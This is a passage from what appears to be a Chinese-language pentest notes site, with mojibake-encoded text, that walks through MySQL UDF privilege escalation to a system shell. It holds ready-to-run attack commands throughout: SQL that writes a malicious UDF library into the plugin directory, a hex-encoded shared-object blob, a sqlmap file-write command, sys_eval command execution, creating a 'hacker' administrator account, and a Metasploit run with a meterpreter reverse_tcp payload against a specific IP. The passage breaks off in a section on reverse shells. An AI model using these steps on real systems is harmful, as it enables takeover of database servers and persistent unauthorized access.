қ¶жңәеёёи§ҒжҖқи·Ҝ","ref":"йқ¶жңәеёёи§ҒжҖқи·Ҝ.md","path":"bajichangjiansilu.html"}]}]}],"config":{"title":"Xeзҡ„еә“","plugins":["highlight","image-zoom","copy-code"]},"file":{"path":"UDFtiquan.html","content":"# **UDFжҸҗжқғ**\nUDFжҸҗжқғжҳҜйҖҡиҝҮж•°жҚ®еә“жқҘе®һзҺ°иҺ·еҸ–зӣ®ж Үзі»з»ҹзҡ„з®ЎзҗҶе‘ҳзҡ„shellпјҢrootпјҢsystemгҖӮиҫҫеҲ°д»ҺдҪҺжқғйҷҗжҸҗжқғеҲ°й«ҳжқғйҷҗВ \n\n^\nз”ЁжҲ·иҮӘе®ҡд№үеҮҪж•°пјҢжҳҜж•°жҚ®еә“еҠҹиғҪзҡ„дёҖз§Қжү©еұ•пјҢз”ЁжҲ·йҖҡиҝҮиҮӘе®ҡд№үеҮҪж•°пјҲеҠЁжҖҒй“ҫжҺҘеә“пјүе®һзҺ°mysqlдёӯж— жі•ж–№дҫҝе®һзҺ°зҡ„еҠҹиғҪпјҢе…¶ж·»еҠ еҫ—ж–°еҮҪж•°йғҪеҸҜд»ҘеңЁsqlиҜӯеҸҘдёӯи°ғз”ЁпјҢе°ұеғҸи°ғз”Ёversion()гҖӮ\n\n## **жҸҗжқғжқЎд»¶**\nжңүдәҶmysqlй«ҳжқғйҷҗпјҢеҰӮrootз”ЁжҲ·гҖӮ\nиҺ·еҸ–пјҡ\n1. 3306з«ҜеҸЈејұеҸЈд»ӨзҲҶз ҙгҖӮ\n2. sqlmap жіЁе…Ҙзҡ„ --sql-shell жЁЎејҸгҖӮsqlmapжҹҘиЎЁжӢҝеҲ°rootжҳҺж–ҮжӢҝеҺ»cmd5зҪ‘з«ҷз ҙиҜ‘ --dump -C \"password\" -T user -D mysqlгҖӮ\n3. зҪ‘з«ҷзҡ„ж•°жҚ®еә“й…ҚзҪ®ж–Үд»¶дёӯжӢҝеҲ°жҳҺж–ҮеҜҶз ҒдҝЎжҒҜгҖӮ\n4. CVE-2012-2122 зӯүиҝҷзұ»жјҸжҙһзӣҙжҺҘжӢҝдёӢMYSQLжқғйҷҗгҖӮ  \n5. phpmyadminзҲҶз ҙзҷ»еҪ•гҖӮ\n6. еҝ…йЎ»иғҪеҶҷж–Үд»¶гҖӮ\n\n^\n## **дёҚеҗҢзүҲжң¬еҠЁжҖҒй“ҫжҺҘеә“dllжҲ–soиҰҒеҶҷе…Ҙзҡ„дҪҚзҪ®**\nжҹҘзңӢзүҲжң¬пјҡselect version();\nMySQL < 5.0пјҢmysqlиғҪжЈҖзҙўзҡ„зӣ®еҪ•еҚіеҸҜгҖӮ\n5.0<=MySQL<5.1 ,йңҖиҰҒеҜјеҮәиҮізӣ®ж ҮжңҚеҠЎеҷЁзҡ„зі»з»ҹзӣ®еҪ•гҖӮпјҲеҰӮпјҡc\/windows\/system32\/пјү\nMySQL >= 5.1 пјҢеҝ…йЎ»ж”ҫзҪ®дәҺ MySQL е®үиЈ…зӣ®еҪ•дёӢзҡ„ lib\\plugin ж–Үд»¶еӨ№дёӢжүҚиғҪеҲӣе»әиҮӘе®ҡд№үеҮҪж•°\n^\nmysqlй…Қд»¶дҪҚзҪ®пјҡselect @@plugin_dir;\nеҰӮжһңдёҚеӯҳеңЁзҡ„иҜқеҸҜд»ҘеңЁ webshell дёӯжүҫеҲ° MySQL зҡ„е®үиЈ…зӣ®еҪ•з„¶еҗҺжүӢе·ҘеҲӣе»әВ \\lib\\plugin\\ж–Үд»¶еӨ№пјҡ\nmysqlе®үиЈ…зӣ®еҪ•дҪҚзҪ®пјҡselect @@basedir;\n\nжҷ®йҖҡlinuxдёӯmysqlпјҡ\/usr\/lib\/mysql\/plugin\/\nе®қеЎ”linuxдёӯmysqlпјҡ\/www\/server\/mysql\/lib\/plugin\/\nwindowsзҡ„phystudyдёӯmysqlпјҡ\\phpstudy_pro\\Extensions\\MySQL5.7.26\\lib\\plugin\\\n^\n## **еҠЁжҖҒй“ҫжҺҘеә“dllжҲ–soж–Үд»¶жқҘжәҗ**\nsqlmapдёӯжңүпјҲ\/usr\/share\/sqlmap\/data\/udf\/пјүпјҢдёҚиҝҮзј–з ҒиҝҮso_пјҢйңҖиҰҒе…Ҳи§Јз ҒжҲҗso\nMSFдёӯзҡ„жІЎжңүзј–з ҒиҝҮзӣҙжҺҘеҸҜз”Ё (ж №зӣ®еҪ•\/embedded\/framework\/data\/exploits\/mysql)\nжҲ–зӣҙжҺҘдёӢиҪҪпјҡ<https:\/\/sqlsec.lanzoux.com\/i4b7jhyhwid>\n\n^\n## **еҶҷе…Ҙе’ҢеҲ©з”Ё**\n**1.еҲ©з”ЁеҚҒе…ӯиҝӣеҲ¶ж•°жҚ®еӯ—з¬ҰеҶҷе…ҘиЎЁеңЁиҪ¬еҢ–жҲҗdllпјҡ**\nиҺ·еҸ–udf.dllж–Үд»¶зҡ„еҚҒе…ӯиҝӣеҲ¶hexеҖјпјҢиҝҷйҮҢеӯҳе…ҘtxtгҖӮ\n>еҸҜд»ҘдҪҝз”Ёе·Ҙе…·жҸҗеҸ–пјҢд№ҹеҸҜд»ҘзӣҙжҺҘдҪҝз”ЁmysqlеҮҪж•°иҜ»иҪ¬еҶҷж–Үд»¶пјҲе·ІзҹҘиғҪиҜ»еҶҷпјүпјҡ\n    select hex(load_file(\"C:\/udf.dll\")) into dumpfile 'C:\/udf.txt'\n```\nзҷ»еҪ•зӣ®ж Үжңәж•°жҚ®еә“пјҢеҲӣе»әиЎЁ:\nuse mysql;\ncreate table udf(c LONGBLOB)  \/\/еҲӣе»әudfиЎЁпјҢcеӯ—ж®ө\n\nиЎЁдёӯжҸ’е…ҘеҖјиҝҷдёӘеҚҒе…ӯиҝӣеҲ¶дёІе№¶hexи§Јз Ғпјҡ\ninsert into udf values(unhex('еҚҒе…ӯиҝӣеҲ¶дёІ'));\n\nжҹҘеҶҷе…Ҙең°еқҖпјҡ\nselect @@plugin_dir;\n\nжҹҘиҝҷдёӘиЎЁзҡ„з»“жһңйҖҡиҝҮinto dumpfile 'xx\/lib\/plugin\/udf.dll'еҶҷе…Ҙпјҡ\\зҡ„и·Ҝеҫ„ж”№дёә\/\nselect c from udf into dumpfile 'D:\/xxx\/udf.dll';\n```\n\n\n^\n**е®һйҷ…зӣҙжҺҘеҶҷеҚҒе…ӯиҝӣеҲ¶дёІеҲ°зӣ®ж Үж–Үд»¶д№ҹеҸҜд»ҘпјҢдёҠйқўдҪңеәҹгҖӮеҚҒе…ӯиҝӣеҲ¶дёІпјҡ**<https:\/\/www.sqlsec.com\/tools\/udf.html>\n```\nselect 0xеҚҒе…ӯиҝӣеҲ¶дёІ into dumpfile 'D:\/xxx\/udf.dll';\n```\nеҮәзҺ°д»ҘдёӢжҠҘй”ҷпјҢжҠҠ64жҚўжҲҗ32дҪҚзҡ„еҚіеҸҜгҖӮ\n```\nERROR 1126 (HY000): Can't open shared library 'udf.dll' (errno: 193 )\n```\n```\nSELECT 0x7f454c4601010100000000000000000003000300010000007009000034000000581200000000000034002000040028001900180001000000000000000000000000000000f80e0000f80e00000500000000100000010000000010000000100000001000000801000010010000060000000010000002000000141000001410000014100000d0000000d0000000060000000400000051e5746400000000000000000000000000000000000000000600000004000000250000002a0000001400000008000000270000001d0000000000000000000000030000000000000011000000000000000a0000002900000012000000200000000000000000000000260000000c0000002100000017000000230000000d000000000000000e0000001c000000150000000000000006000000000000000000000010000000220000000f0000002400000019000000180000000000000000000000000000000000000000000000000000001a0000000200000013000000050000000000000000000000000000000000000000000000000000001f000 00000000040000000000000008000000000000001000000000000000a3000000010000000300000000000000d016200000000000d0160000000000001800000000000000000000000000000008000000000000000800000000000000a8000000010000000300000000000000e8162000'));\n```\n\n^\n^\n**2.зӣҙжҺҘеҲ©з”Ёsqlmapзҡ„postдј еҸӮе°ҶеҠЁжҖҒй“ҫжҺҘеә“ж–Үд»¶еҶҷе…Ҙmysqlзӣ®еҪ•пјҡ**\nSQL жіЁе…Ҙдё”жҳҜй«ҳжқғйҷҗпјҢplugin зӣ®еҪ•еҸҜеҶҷдё”йңҖиҰҒ secure\\_file\\_priv ж— йҷҗеҲ¶пјҢMySQL жҸ’д»¶зӣ®еҪ•еҸҜд»Ҙиў« MySQL з”ЁжҲ·еҶҷе…ҘпјҢиҝҷдёӘж—¶еҖҷе°ұеҸҜд»ҘзӣҙжҺҘдҪҝз”Ё sqlmap жқҘдёҠдј еҠЁжҖҒй“ҫжҺҘеә“пјҢеҸҲеӣ дёә GET жңү**еӯ—иҠӮй•ҝеәҰйҷҗеҲ¶**пјҢжүҖд»ҘеҫҖеҫҖ POST жіЁе…ҘжүҚеҸҜд»Ҙжү§иЎҢиҝҷз§Қж”»еҮ»\n```\n--secure-file-priv = null  \/\/д»»дҪ•дёҚеҸҜиҜ»еҶҷ\n--secure-file-priv =        \/\/д»»дҪ•еҸҜиҜ»еҶҷ\n--secure-file-priv = c:\\   \/\/еҸӘжңүCзӣҳеҸҜиҜ»еҶҷ\nеңЁ MySQL 5.5 д№ӢеүҚ secure_file_priv й»ҳи®ӨжҳҜз©әпјҢиҝҷдёӘжғ…еҶөдёӢеҸҜд»Ҙеҗ‘д»»ж„Ҹз»қеҜ№и·Ҝеҫ„иҜ»еҶҷж–Үд»¶\nеңЁ MySQL 5.5 д№ӢеҗҺ secure_file_priv й»ҳи®ӨжҳҜ NULLпјҢиҝҷдёӘжғ…еҶөдёӢдёҚеҸҜд»ҘиҜ»еҶҷж–Үд»¶\nжҹҘзңӢй…ҚзҪ®пјҡ\nshow variables like '%secure%';\n```\nsqlmapеҶҷеҠЁжҖҒй“ҫжҺҘеә“\n```\nsqlmap -u \"http:\/\/localhost:30008\/\" --data=\"id=1\" \n--file-write=\"\/Users\/sec\/Desktop\/lib_mysqludf_sys_64.so\" \n--file-dest=\"\/usr\/lib\/mysql\/plugin\/udf.so\"\n```\n\n^\n**3.жҸҗжқғеҲ©з”Ёпјҡ**\nеҸҜд»ҘеҲ©з”ЁеҠЁжҖҒй“ҫжҺҘеә“йҮҢе®ҡд№үеҮҪж•°пјҢдҪҝз”ЁеҸҜд»Ҙж“ҚдҪңзі»з»ҹshellзҡ„еҮҪж•°пјҢдё”дёәжңҖй«ҳжқғйҷҗsystemгҖӮ\n```\nCREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.dll'; \/\/еҲӣе»әеҮҪж•°\n\nselect * from mysql.func; \/\/жҹҘзңӢиҮӘе®ҡд№үзҡ„еҮҪж•°\ndrop function sys_eval; \/\/еҲ йҷӨиҮӘе®ҡд№үеҮҪж•°\n\nselect sys_eval('whoami'); \/\/дҪҝз”ЁеҮҪж•°\nselect sys_eval('sudo ls \/root'); \n```\nwindowsеҠ з”ЁжҲ·е№¶еҠ е…Ҙз®ЎзҗҶе‘ҳз»„\n```\nеҲӣе»әдёҖдёӘз”ЁжҲ·hacker ,еҜҶз Ғ123456\nnet user hacker 123456 \/add\n\nе°Ҷhackerз”ЁжҲ·еҠ е…Ҙз®ЎзҗҶе‘ҳз»„пјҢжңүиҝңзЁӢзҷ»еҪ•жқғйҷҗгҖӮ\nnet localgroup administrators hacker \/add\n`\n```\n\n^\n^\n## **MSFзӣҙжҺҘдҪҝз”ЁUDFжЁЎеқ—**\nеүҚжҸҗпјҡmysqlзҡ„rootиҙҰеҸ·зҹҘйҒ“еҜҶз ҒпјҢејҖеҗҜдәҶеӨ–й“ҫзҷ»еҪ•пјҢеҸҜд»ҘеҶҷж–Үд»¶гҖӮ\n```\nејҖеҗҜпјҡ\nGRANT ALL PRIVILEGES ON *.* TO 'еёҗеҸ·'@'%'IDENTIFIED BY 'еҜҶз Ғ' WITH GRANT OPTION;\n```\nдҪҝз”ЁMSFдёӯзҡ„exploit\/multimysql\/mysql_udf_payloadжЁЎеқ—еҸҜд»ҘиҝӣиЎҢUDFжҸҗжқғпјҢжіЁе…ҘdllгҖӮ\nMSFдјҡе°Ҷdllж–Үд»¶еҶҷе…Ҙlib\\plugin\\зӣ®еҪ•дёӢпјҲеүҚжҸҗжҳҜиҜҘзӣ®еҪ•еӯҳеңЁпјҢйңҖжүӢе·ҘеҲӣе»әпјүпјҢ\nиҜҘdllж–Үд»¶дёӯеҢ…еҗ«sys_exec(пјүе’Ңsys_eval(пјүдёӨдёӘеҮҪж•°пјҢдҪҶжҳҜй»ҳи®ӨеҸӘеҲӣе»әsys_exec(пјүеҮҪж•°пјҢиҜҘеҮҪж•°жү§иЎҢе№¶дёҚдјҡжңүеӣһжҳҫгҖӮ\nжҲ‘д»¬еҸҜд»ҘжүӢеҠЁеҲӣе»әsys_eval()еҮҪж•°пјҢжқҘжү§иЎҢжңүеӣһжҳҫзҡ„е‘Ҫд»ӨгҖӮ\nMSF:пјҲеүҚжҸҗmysqlзҡ„rootејҖеҗҜдәҶеӨ–й“ҫпјү\n```\nuse exploit\/multi\/mysql\/mysql_udf_payload\nshow options\nset payload windows\/meterpreter\/reverse_tcp\nset username root\nset password rootеҜҶз Ғ\nset rhosts 47.102.195.100\nrun\n```\nNavicatдёӯпјҡ\n```\nMSFеӨ–й“ҫrootеҜје…ҘdllеҗҺпјҢеҶҚsqlиҜӯеҸҘжү§иЎҢеҗҺз»ӯе‘Ҫд»Өи°ғз”Ёжү§иЎҢ\nselect * from mysql.func where name=\"sys_exec\";\/\/жҹҘзңӢиҮӘд№үе®ҡеҮҪж•°дёӯжңүж— sys_execдәҶпјҢд№ҹеҸҜд»ҘзңӢеҲ°з»‘е®ҡзҡ„dllеҗҚз§°\ncreate function sys_eval retums string soname \"WqkerHcA.dll\";\/\/еҲӣе»әеҮҪж•°sys_eval()з»‘е®ҡdllпјҢdllеҗҚеӯ—йҡҸжңәйңҖиҰҒжүӢеҠЁжҹҘзңӢжҲ–дёҠдёҖжқЎе‘Ҫд»ӨжҹҘзңӢгҖӮ\nselect sys_eval(\"whoami\");\/и°ғз”ЁеҮҪж•°иҝӣиЎҢе‘Ҫд»Өжү§иЎҢ\n```\n^\n^\n# **еҶ…зҪ‘MySQL UDFжҸҗжқғ**\nеҒҮи®ҫзӣ®ж Ү MySQL еңЁеҶ…зҪ‘жғ…еҶөдёӢпјҢе·Із»ҸејҖеҗҜдәҶеӨ–й“ҫпјҢж— жі•зӣҙиҝһ MySQL жҲ–иҖ… MySQLиҙҰеҸ·дёҚе…Ғи®ёеӨ–иҝһпјҢиҝҷдёӘж—¶еҖҷдёҖдәӣжңҚеҠЎз«Ҝжң¬ең°зҪ‘йЎөи„ҡжң¬пјҲжң¬ең°localhostиҝһжҺҘпјүе°ұжҜ”иҫғж–№дҫҝеҘҪз”ЁдәҶгҖӮ\n\nдёҠдј иҝҷдёӘphpзЁӢеәҸеҲ°зӣ®ж Үз«ҷзӮ№пјҢзҷ»еҪ•еҶ…зҪ‘mysqlе’ҢдёҖй”®UDFжҸҗжқғпјҡ<https:\/\/github.com\/echohun\/tools\/blob\/master\/%E5%A4%A7%E9%A9%AC\/udf.php>\n\nжҲ–иҖ…дёҠдј еӯҳеңЁsqlжіЁе…Ҙзҡ„datagearжңҚеҠЎпјҢjava8еҗҜеҠЁпјҢеҸҜд»ҘиҝһжҺҘlocalhostпјҢиҜ»ж•°жҚ®пјҢеҶҚз”ЁsqlmapжҸҗжқғгҖӮ\n\nжҲ–иҖ…еҸҜжү§иЎҢж–Үд»¶еҰӮgoзЁӢеәҸеҸҜд»Ҙй…ҚзҪ®иҝһжҺҘжң¬ең°ж•°жҚ®еә“зҡ„гҖӮ\n\nжҲ–иҖ…з«ҜеҸЈиҪ¬еҸ‘гҖӮ\n^\n^\n^\n# **UDF+еҸҚеј№shellжҸҗжқғ**\nUDF жҸҗжқғзҡ„еҸҰдёҖз§Қз”Ёжі•пјҢиҝҷйҮҢзҡ„еҠЁжҖҒй“ҫжҺҘеә“иў«е®ҡеҲ¶иҝҮзҡ„пјҢ\nеҰ
